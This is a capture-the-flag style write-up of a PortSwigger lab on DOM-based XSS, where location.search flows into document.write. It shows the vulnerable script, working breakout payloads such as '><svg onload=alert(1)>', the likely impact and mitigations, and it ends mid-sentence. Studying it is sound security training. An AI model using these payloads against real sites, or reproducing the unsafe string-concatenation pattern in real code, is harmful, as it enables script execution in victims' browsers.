# DOM XSS in document.write sink using source location.search

**Source:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)  
**Category:** XSS  
**Difficulty:** APPRENTICE

## Objective
To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Vulnerability
This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

## Exploitation

### Steps

1. Entering the laboratory and searching for `test` using the search form. After opening DevTools, we can find the following code:

```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }

    var query = (new URLSearchParams(window.location.search)).get('search');

    if(query) {
        trackSearch(query);
    }
</script>

<img src="/resources/images/tracker.gif?searchTerms=test">
```

This function retrieves a parameter from the URL and writes it into an `<img>` tag, which allows us to inject our own markup through the URL.

2. Added `?search=" onerror="alert(1)"` to the URL and refresh the page.

    Why specifically `onerror`?

    Because it is easy to trigger an error by making the browser attempt to load an image that does not exist.

    The alert was displayed, but the lab was not solved.

3. Submitting `" onerror="alert(1)"` through the search form also displayed the alert, but the lab was still not solved.

4. An attempt to close the `<img>` tag and create a new `<svg onload=alert(1)>` element, by adding `?search="><svg onload=alert(1)>` to the URL. The alert was displayed and the lab was solved.

### Payload

```html
"><svg onload=alert(1)>
```

Full parameter:

```text
?search="><svg onload=alert(1)>
```

### Shortcut

1. Inspect the search page and identify that the `search` parameter is read from `location.search`:

```javascript
var query = (new URLSearchParams(window.location.search)).get('search');
```

2. Notice that the value is inserted directly into HTML using `document.write()`:

```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
```

3. Break out of the generated `<img>` element and inject an SVG element with an `onload` handler:

```text
?search="><svg onload=alert(1)>
```

Loading the page causes the injected SVG element to execute `alert(1)` and solves the lab.

## Impact

An attacker can construct a malicious URL containing HTML and JavaScript that is interpreted by the victim's browser when the vulnerable page is opened.

Because the attacker-controlled value is written directly into the DOM using `document.write()`, arbitrary markup can be injected. Depending on the application's security controls and the victim's privileges, this could allow an attacker to execute JavaScript in the application's origin, access data available to client-side scripts, modify page content, perform actions as the victim, or carry out phishing attacks.

## Mitigation

User-controlled data should not be passed directly to `document.write()`.

The application should avoid generating HTML by concatenating strings containing untrusted values. Instead, safe DOM APIs such as `textContent`, `createElement()`, and appropriate attribute setters should be used.

If user-controlled input must be inserted into HTML, it should be encoded according to the exact output context before being added to the page.

A restrictive Content Security Policy (CSP) can provide additional defense in depth, but it should not replace safe handling of untrusted data.

## Tools

- Browser DevTools

## Notes

`location.search` can act as a source of attacker-controlled data in DOM-based X